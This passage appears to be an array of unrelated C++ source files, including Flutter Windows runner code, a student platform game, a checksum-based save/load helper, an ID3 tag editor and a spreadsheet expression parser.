list;\n  //std::cout << \"destructor of alt: \" << this << \"\\n\"; // testing\n} //end destructor\n\narrayListType::arrayListType(const arrayListType& otherList)\n{\n  maxSize = otherList.maxSize;\n  length = otherList.length;\n\n  list = new int[maxSize];  //create the array\n\n  for (int j = 0; j < length; j++)  //copy otherList\n    list[j] = otherList.list[j];\n\n  //std::cout << \"copy constructor of alt: \" << this << \"\\n\"; // testing\n}//end copy constructor\n\n//--------------------\n// non-member, friend\n//--------------------\nstd::ostream& operator<<(std::ostream& out, const arrayListType& obj)\n{\n  for (int i = 0; i < obj.length; i++)\n    out << obj.list[i] << \" \";\n  return out;\n} //end operator<<\n\n//---------------------\n//---------------------",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Game Name: Cosmic Climb\r\n// Written by: Caden Leedy\r\n// Date: 12/06/2022\r\n//\r\n// Instructions: Try to climb as high as possible without falling by bouncing off the white platforms. Hover over the screen\r\n// with the mouse and move it left or right to move the ball. \r\n//\r\n\r\n#include \"graphics.h\"\r\n#include <iostream>\r\n#include <string>\r\n#include <random>\r\n#include <cmath>\r\n#include <stdio.h>\r\n#include <string>\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int BACKGROUND_COLOR = BLUE;\r\nconst int TEXT_COLOR = WHITE;\r\nconst int ARRAYSIZE = 9;\r\nconst int INITVEL = -26;\r\n\r\nrandom_device myEngine;\r\nuniform_real_distribution<double> randomReal(0.0, 1.0);\r\n\r\n\r\n//enumerated types:\r\n\r\n//defines enumerated type for the different types of platforms\r\nenum PlatformType { STATIC, BROKEN, MOVING };\r\n\r\n//defines enumerated type for different scenarios of the ball landing on a platform\r\nenum Landed { LEFT, MIDDLE, RIGHT };\r\n\r\n//set gravity\r\nconst double GRAVITY = 1.00;\r\n\r\n//constant variables for starting position of ball for each new game\r\nconst double RESETX = 250;\r\nconst double RESETY = 750;\r\n\r\n\r\n//Structure definitions:\r\n\r\n//defines structure for the player which is the ball\r\nstruct Player {\r\n\t// Variables to keep track of position, previous position, and velocity\r\n\tdouble x, y, prevX, prevY, velX, velY, gravity = GRAVITY;\r\n\tint color;\r\n\tbool alive;\r\n\r\n\r\n\r\n\t//a \"constructor\" function\r\n\tPlayer(int c) {\r\n\t\tcolor = c;\r\n\t\talive = true;\r\n\r\n\t\t// Set Initial Position\r\n\t\tx = RESETX;\r\n\t\ty = RESETY;\r\n\r\n\t\t//set previous position to be current position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t// Set Initial Velocity\r\n\t\tvelX = 0;\r\n\t\tvelY = INITVEL;\r\n\t} // end Player() constructor function\r\n\r\n\tvoid move() {\r\n\r\n\t\t//set previous position equal to current position to keep track of old position\r\n\t\tprevX = x;\r\n\t\tprevY = y;\r\n\r\n\t\t//erase old position\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tfillellipse(prevX, prevY, 20, 20);\r\n\r\n\t\t//move ball and redraw it\r\n\t\tx += velX;\r\n\t\ty += velY;\r\n\r\n\t\t//if ball goes off one side of the screen, makes it re-enter on the other side\r\n\t\tif (x <= -15) {\r\n\t\t\tx = 515;\r\n\t\t}\r\n\t\telse if (x >= 515) {\r\n\t\t\tx = -15;\r\n\t\t}\r\n\r\n\r\n\t\tsetcolor(color);\r\n\t\tsetfillstyle(SOLID_FILL, color);\r\n\t\tfillellipse(x, y, 20, 20);\r\n\r\n\r\n\r\n\t\tvelY += gravity; //change the velocity  by the acceleration due to gravity\r\n\r\n\r\n\t\tvelX = (static_cast<double>((250 - mousex()) * (-1))) / 10;\r\n\r\n\t}\r\n};\r\n\r\n\r\n//defines structure for the platforms\r\nstruct Platform {\r\n\tdouble x, y, prevX, prevY, velX, velY;\r\n\tPlatformType type;\r\n\tbool alive;\r\n\tbool spring;\r\n\r\n\r\n\t//function to calculate distance from player center to top left corner of platform\r\n\t// input the player.x and player.y\r\n\tdouble Ldistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x - 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\t//function to calculate distance from player center to top right corner of platform\r\n\t// input the ball.x and ball.y\r\n\tdouble Rdistance(double ballx, double bally) {\r\n\t\tdouble distance = sqrt(pow(ballx - (x + 40), 2) + pow(bally - (y), 2));\r\n\t\treturn distance;\r\n\t}\r\n\r\n\t//function that determines if the ball landed on the plaform, \r\n\t//and returns whether it hit the left rounded edge, somewhere in the middle, or the right rounded edge of the platform\r\n\t//input ball.x, ball.y, and ball.velY\r\n\tLanded landedOn(double ballx, double bally, double prevbally, double vely) {\r\n\t\tif (vely > 0) {\r\n\t\t\tif (((ballx - 15) <= (x + 40)) && ((ballx + 15) >= (x - 40)) && ((bally + 20) >= (y - 5)) && ((prevbally + 20) <= (y - 5))) {\r\n\t\t\t\t//if ((ballx <= (x + 40)) && (ballx >= (x - 40)) && ((bally) >= (y + 5)) && ((y-bally) <=25)) {\r\n\t\t\t\treturn MIDDLE;\r\n\t\t\t}\r\n\t\t\t/*else if ((Ldistance(ballx, bally) <= 25) && ballx < (x - 40)) {\r\n\t\t\t\treturn LEFT;\r\n\t\t\t}\r\n\t\t\telse if ((Rdistance(ballx, bally) <= 25) && ballx > (x + 40)) {\r\n\t\t\t\treturn RIGHT;\r\n\t\t\t}\r\n\t\t\t*/\r\n\t\t}\r\n\t}\r\n\r\n\tvoid move(bool moveY) {\r\n\t\t//erase old\r\n\t\tsetcolor(BLUE);\r\n\t\tsetfillstyle(SOLID_FILL, BLUE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\r\n\t\tif (type == MOVING) {\r\n\t\t\tif (x >= 450 || x <= 50) {\r\n\t\t\t\tvelX *= -1;\r\n\t\t\t}\r\n\t\t\tx += velX;\r\n\t\t}\r\n\t\tif (moveY)\r\n\t\t\ty -= velY;\r\n\r\n\t\t//draw new\r\n\t\tsetcolor(WHITE);\r\n\t\tsetfillstyle(SOLID_FILL, WHITE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\t}\r\n\r\n\r\n};\r\n//end structure definitions\r\n\r\n\r\n\r\n//Function prototypes\r\nvoid welcomeScreen();\r\nvoid drawHoop(int, int);\r\nvoid initPlatform(Platform&, double, double, int);\r\nvoid bounceball(Landed, Player&, Platform&);\r\nvoid drawPlatform(double, double);\r\nvoid displayScore(int, int, int);\r\nvoid setCosmos(int[], int[]);\r\nvoid drawCosmos(int [], int[]);\r\n\r\nint main()\r\n{\r\n\tbool keepGoing = true;\r\n\tbool movingPlatforms = false;\r\n\tdouble platformVel = 0;\r\n\tchar keyPressed;\r\n\tint score = 0;\r\n\tint xArray[500];\r\n\tint yArray[500];\r\n\r\n\r\n\r\n\tinitwindow(500, 800, (char*)\"Cosmic Climb\", 10, 10);\r\n\r\n  \tsetCosmos(xAr",
    "#include \"DataLoadSave.h\"\r\n\r\n\r\nDataLoadSave::DataLoadSave()\r\n:m_seed(777){}\r\n\r\nint DataLoadSave::SaveData(const std::string& filepath, void* data, uint64_t size)\r\n{\r\n\t//Open file for writing in binary mode\r\n\tstd::ofstream file(filepath, std::ios_base::binary | std::ios_base::out);\r\n\t\r\n\t//Check if failed to open file\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Generate a hash\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(data, size);\r\n\r\n\t//Store the hash\r\n\tuint64_t hash = hasher.hash();\r\n\r\n\t//Starting the actual writing of data\r\n\tfile.write((char*)data, size);\r\n\tfile.write((char*)&hash, sizeof(hash));\r\n\r\n\t//Close the file\r\n\tfile.close();\r\n\r\n\t//Return 0 if successful\r\n\treturn SUCCESS;\r\n}\r\n\r\nint DataLoadSave::LoadData(const std::string& filepath, char* src, uint64_t src_size)\r\n{\r\n\t//Open file for Loading data\r\n\tstd::ifstream file(filepath, std::ios_base::binary);\r\n\r\n\t//Check if file is open\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Start by calculating the file size\r\n\tfile.seekg(0, std::ios::end);\r\n\tuint64_t fsize = file.tellg();\r\n\r\n\t//Reset moved file pointer to start again\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\t//if file is empty return -3\r\n\tif (fsize == 0) \r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_EMPTY;\r\n\t}\r\n\r\n\t//Subtract the last 64 bits or 8 bytes of hash to get data struct size\r\n\tuint64_t datasize = fsize - sizeof(uint64_t);\r\n\r\n\tif (datasize > src_size)\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn SRC_SIZE_NOT_SUFFICIENT;\r\n\t}\r\n\r\n\t//Read the file's data into address of src\r\n\tfile.read(src, src_size);\r\n\r\n\t//Read the file checksum stored at the last of the file\r\n\tuint64_t expectedHash = 0;\r\n\tfile.read((char*)&expectedHash, sizeof(expectedHash));\r\n\r\n\t//Generate hash of the read data\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(&src, datasize);\r\n\r\n\t//if checksum doesnt match then file is probably corrupted\r\n\tif (expectedHash != hasher.hash())\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_CORRUPT;\r\n\t}\r\n\r\n\tfile.close();\r\n\treturn SUCCESS;\r\n}\r\n\r\n",
    "#include <bits/stdc++.h>\r\n#include <windows.h>\r\nusing namespace std;\r\n\r\nclass Formatas {\r\npublic:\r\n    char tag[3];\r\n    char pavadinimas[30];\r\n    char atlikejas[30];\r\n    char albumas[30];\r\n\r\n    void Read(const char* failo_pavadinimas) {\r\n        HANDLE file = CreateFile(failo_pavadinimas, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n        \r\n        if (file == INVALID_HANDLE_VALUE) {\r\n            cerr << \"Nepavyko atidaryti failo!\";\r\n            return;\r\n        }\r\n\r\n        SetFilePointer(file, -128, NULL, FILE_END);\r\n        DWORD bytesRead;\r\n        ReadFile(file, tag, 3, &bytesRead, NULL);       \r\n        ReadFile(file, pavadinimas, 30, &bytesRead, NULL);     \r\n        ReadFile(file, atlikejas, 30, &bytesRead, NULL);    \r\n        ReadFile(file, albumas, 30, &bytesRead, NULL);     \r\n        CloseHandle(file);\r\n    }\r\n\r\n    void Write(const char* failo_pavadinimas) {\r\n        HANDLE file = CreateFile(failo_pavadinimas, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\r\n        \r\n        SetFilePointer(file, -128, NULL, FILE_END);\r\n        DWORD bytesWritten;\r\n        WriteFile(file, tag, 3, &bytesWritten, NULL);      \r\n        WriteFile(file, pavadinimas, 30, &bytesWritten, NULL); \r\n        WriteFile(file, atlikejas, 30, &bytesWritten, NULL);   \r\n        WriteFile(file, albumas, 30, &bytesWritten, NULL);   \r\n        CloseHandle(file);\r\n    }\r\n};\r\n\r\nint main() {\r\n    const char* failo_pavadinimas = \"bensound-far.mp3\";\r\n    Formatas* IDv3= static_cast<Formatas*>(VirtualAlloc(NULL, sizeof(Formatas), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));\r\n\r\n    IDv3->Read(failo_pavadinimas);\r\n\r\n    cout << \"Pavadinimas: \" << IDv3->pavadinimas << endl;\r\n    cout << \"Atlikejas: \" << IDv3->atlikejas << endl;\r\n    cout << \"Albumas: \" << IDv3->albumas << endl;\r\n   \r\n    cout << \"\\nIveskite nauja pavadinima: \";\r\n    cin.getline(IDv3->pavadinimas, sizeof(IDv3->pavadinimas));\r\n    cout << \"Iveskite nauja atlikeja: \";\r\n    cin.getline(IDv3->atlikejas, sizeof(IDv3->atlikejas));\r\n    cout << \"Iveskite nauja albuma: \";\r\n    cin.getline(IDv3->albumas, sizeof(IDv3->albumas));\r\n\r\n    IDv3->Write(failo_pavadinimas);\r\n    VirtualFree(IDv3, sizeof(Formatas), MEM_RELEASE);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"excel.h\"\n#include <fstream>\n\nnamespace MyExcel {\n\tVector::Vector(int n) : data(new string[n]), capacity(n), length(0) {}\n\tvoid Vector::push_back(string s) {\n\t\tif (capacity <= length) {\n\t\t\tstring* tmp = new string[capacity * 2];\n\t\t\tfor (int i = 0; i < length; i++) {\n\t\t\t\ttmp[i] = data[i];\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t\tdata = tmp;\n\t\t\tcapacity *= 2;\n\t\t}\n\t\tdata[length] = s;\n\t\tlength++;\n\t}\n\tstring Vector::operator[](int i) { return data[i]; }\n\tvoid Vector::remove(int x) {\n\t\tfor (int i = x + 1; i < length; i++) {\n\t\t\tdata[i - 1] = data[i];\n\t\t}\n\t\tlength--;\n\t}\n\tint Vector::size() { return length; }\n\tVector::~Vector() {\n\t\tif (data) {\n\t\t\tdelete[] data;\n\t\t}\n\t}\n\n\tStack::Stack() : start(NULL, \"\") { current = &start; }\n\tvoid Stack::push(string s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tstring Stack::pop() {\n\t\tif (current == &start)\n\t\t\treturn \"\";\n\n\t\tstring s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tstring Stack::peek() { return current->s; }\n\tbool Stack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tStack::~Stack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\tNumStack::NumStack() : start(NULL, 0) { current = &start; }\n\tvoid NumStack::push(double s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tdouble NumStack::pop() {\n\t\tif (current == &start)\n\t\t\treturn 0;\n\n\t\tdouble s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tdouble NumStack::peek() { return current->s; }\n\tbool NumStack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tNumStack::~NumStack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\n\t// Myexcel\n\t// Cell \ud074\ub798\uc2a4(\ucd94\uc0c1_) \n\tCell::Cell(int x, int y, Table* table)\n\t\t: x(x), y(y), table(table) {}\n\n\t// StringCell\n\tStringCell::StringCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring StringCell::stringify() { return data; }\n\tint StringCell::to_numeric() { return 0; }\n\n\t// NumberCell\n\tNumberCell::NumberCell(int data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring NumberCell::stringify() { return to_string(data); }\n\tint NumberCell::to_numeric() { return data; }\n\n\t// *** DateCell\n\tDateCell::DateCell(string s, int x, int y, Table* t) : Cell(x, y, t) {\n\t\t// Date format => yyyy-mm-dd\n\t\t// time_t \uac12\uc73c\ub85c \ubcc0\ud658\ud560 \ub0a0\uc9dc\n\t\tint year = atoi(s.c_str());\n\t\tint month = atoi(s.c_str()+5);\n\t\tint day = atoi(s.c_str()+8);\n\n\t\t// struct tm(tm \uad6c\uc870\uccb4) : \uc0ac\ub78c\uc774 \uc0ac\uc6a9\ud558\ub294 \ub0a0\uc9dc \uac1c\ub150 \uc801\uc6a9\ud55c \uad6c\uc870\uccb4\n\t\ttm timeinfo;\n\n\t\ttimeinfo.tm_year = year - 1900;\n\t\ttimeinfo.tm_mon = month - 1;\n\t\ttimeinfo.tm_mday = day;\n\t\ttimeinfo.tm_hour = 0;\n\t\ttimeinfo.tm_min = 0;\n\t\ttimeinfo.tm_sec = 0;\n\n\t\t// tm -> time_t \uac12\uc73c\ub85c \ubcc0\ud658\n\t\tdata = mktime(&timeinfo); \n\t}\n\n\tstring DateCell::stringify() {\n\t\tchar buf[50];\n\t\ttm temp;\n\t\t// localtime_s : \uc2e4\ud589 \uc2dc\uc810\uc758 \uac12\n\t\t// time_t \ud615\uc2dd\uc744 \ub144\uc6d4\uc77c\uc2dc\ubd84\ucd08 \ud615\ud0dc\ub85c \ubd84\ud560\ud55c \uc77c\uc2dc(struct tm \ud615\uc2dd)\ub85c \ubcc0\ud658\n\t\t// \uba64\ubc84\uac00 \uc788\ub294 tm \uad6c\uc870\uccb4\uc5d0 \ub300\ud55c \ud3ec\uc778\ud130 \ubc18\ud658\n\t\tlocaltime_s(&temp, &data);\n\t\t// string\uc73c\ub85c \ubc18\ud658\n\t\t// %F => ISO \ub0a0\uc9dc \ud615\uc2dd(%Y-%m-%d\uc640 \ub3d9\uc77c).\n\t\tstrftime(buf, 50, \"%F\", &temp);\n\n\t\treturn string(buf);\n\t}\n\n\tint DateCell::to_numeric() {\n\t\t// \ud0c0\uc785 \uce90\uc2a4\ud2b8 \uc5f0\uc0b0\uc790\n\t\treturn static_cast<int>(data);\n\t}\n\n\tExprCell::ExprCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t), parsed_expr(new MyExcel::Vector()) {\n\t\t// \uc0dd\uc131\uc790\uc5d0\uc11c \uc218\uc2dd\uc744 \ud30c\uc2f1\ud558\uc5ec exp_vec \uc5d0 \uc800\uc7a5\n\t\tparse_expression();\n\t}\n\n\tExprCell::~ExprCell() {\n\t\tif (parsed_expr) {\n\t\t\tdelete[] parsed_expr;\n\t\t\tparsed_expr = nullptr;\n\t\t}\n\t}\n\n\tint ExprCell::precedence(char c) {\n\t\tswitch (c) {\n\t\tcase '(':\n\t\tcase '[':\n\t\tcase '{':\n\t\t\treturn 0;\n\t\tcase '+':\n\t\tcase '-':\n\t\t\treturn 1;\n\t\tcase '*':\n\t\tcase '/':\n\t\t\treturn 2;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tvoid ExprCell::parse_expression() {\n\t\tStack stack;\n\t\t\n\t\t// \uc218\uc2dd \uc804\uccb4\ub97c ()\ub85c \ubb36\uace0 exp_vec \uc5d0 \ub0a8\uc544\uc788\ub294 \uc5f0\uc0b0\uc790\ub4e4\uc774 push \ub418\ub3c4\ub85d... (data \uac12)\n\t\tdata.insert(0, \"(\");\n\t\tdata.push_back(')');\t\t\n\n\t\tfor (int i = 0; i < data.length(); i++) {\n\t\t\t// isalpha : \uc54c\ud30c\ubcb3\uc778\uc9c0 => \ub300\ubd84\uc790\uba74 1, \uc18c\ubb38\uc790\uba74 2, \uc544\ub2c8\uba74 0 \ubc18\ud658\n\t\t\tif (isalpha(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 2));\n\t\t\t\ti++;\n\t\t\t}\n\t\t\telse if (isdigit(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == '(' || data[i] == '[' || data[i] == '{') {\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == ')' || data[i] == ']' || data[i] == '}') {\n\t\t\t\tstring t = stack.pop();\n\t\t\t\twhile (t != \"(\" && t != \"[\" && t != \"{\") {\n\t\t\t\t\texp_vec.push_back(t);\n\t\t\t\t\tt = stack.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/') {\n\t\t\t\twhile (!stack.is_empty() && precedence(stack.peek()[0]) >= precedence(data[i])) {\n\t\t\t\t\texp_vec.push_back(stack.pop());\n\t\t\t\t}\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t}\t\t\n\t\t// parsed_expr \uc5d0 exp_vec \uc8fc\uc18c \ud560\ub2f9 =================================================================================>>>>\n\t\t// std::string* Myexcel::ExprCell << Myexcel::Vector Myexcel::ExprCell\t\t\n\t\t// ==> parsed_expr\ub97c Vector* \ub85c \ubc14\uafc8 (excel.h \ud655\uc778)\n\t\t\n\t\tparsed_expr = &exp_vec;\n\t}\n\n\t//",
